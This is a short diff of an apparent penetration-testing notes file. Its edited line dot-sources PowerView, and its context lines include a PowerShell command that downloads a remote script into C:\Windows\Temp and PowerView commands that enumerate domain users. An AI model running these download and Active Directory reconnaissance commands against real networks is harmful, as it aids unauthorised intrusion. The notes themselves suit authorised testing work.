@@ -65,7 +65,7 @@ OR If already running-
 ```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```
 
 # Powerview
-```. ./PowerView.ps1```
+```. .\PowerView.ps1```
 #### User Search
 ```Get-DomainUser```
 ```Get-DomainUser –Identity bob```
